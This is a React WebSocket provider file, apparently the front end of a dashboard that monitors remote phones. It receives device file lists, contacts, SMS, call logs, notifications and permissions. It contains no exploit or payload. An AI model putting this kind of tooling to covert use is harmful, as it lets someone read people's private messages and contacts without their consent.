import { createContext, useContext, useEffect, useRef } from "react";
import { useDevice } from "./DeviceContext";
import { host } from "../serverConfig.json";
import { Context } from "./context";

export const WebSocketContext = createContext();

export const WebSocketProvider = ({ children }) => {
  const socketRef = useRef(null);
  const { dispatch } = useDevice();
  const { userInfo } = useContext(Context);

  useEffect(() => {
    if (!userInfo) return; // Wait for token

    socketRef.current = new WebSocket(host);

    socketRef.current.onopen = () => {
      // Send a JSON message with a random id and the token every 5 seconds
      const sendPing = () => {
        const message = JSON.stringify({
          token: userInfo?.token || localStorage.getItem("token") || "",
          get_my_online_devices: true,
        });
        socketRef.current.send(message);
      };
      sendPing(); // Send immediately on open
      socketRef.current.pingInterval = setInterval(sendPing, 5000);
    };

    socketRef.current.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleWSMessage(message);
      } catch (error) {
        console.error("WS parse error", error);
      }
    };

    return () => {
      if (socketRef.current?.pingInterval) {
        clearInterval(socketRef.current.pingInterval);
      }
      socketRef.current?.close();
    };
    // Only reconnect if token changes
  }, [userInfo]);

  const handleWSMessage = (message) => {
    const { type, data } = message;
    switch (type) {
      case "my_devices":
        dispatch({ type: "SET_MY_DEVICES", payload: data });
        break;
      case "statusDevice":
        dispatch({ type: "SET_DEVICE_INFO", payload: data });
        break;
      case "fileList":
        dispatch({ type: "SET_FILE_LIST", payload: data });
        break;
      case "contactList":
        dispatch({ type: "SET_CONTACT_LIST", payload: data });
        break;
      case "smsList":
        dispatch({ type: "SET_MESSAGE_LIST", payload: data });
        break;
      case "callLogList":
        dispatch({ type: "SET_CALL_LOG_LIST", payload: data });
        break;
      case "permissions":
        dispatch({ type: "SET_GRANTED_PERMISSIONS", payload: data });
        break;
      case "auto-downloads":
        dispatch({ type: "SET_AUTO_DOWNLOADS", payload: data });
        break;
      case "notifications":
        dispatch({ type: "SET_NOTIFICATIONS", payload: data });
        break;
      case "DeviceInformation":
        dispatch({ type: "SET_DEVICE_INFORMATION", payload: data });
        break;
      case "device_stats":
        dispatch({ type: "SET_DEVICE_STATS", payload: data });
        break;
      default:
        console.warn("Unknown WS message type", type);
    }
  };

  return (
    <WebSocketContext.Provider value={{ socketRef }}>
      {children}
    </WebSocketContext.Provider>
  );
};

// Utility function to send a message through the WebSocket
export function sendWebSocketMessage(socket, data) {
  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify(data));
  } else {
    console.warn("WebSocket is not open. Message not sent.", data);
  }
}
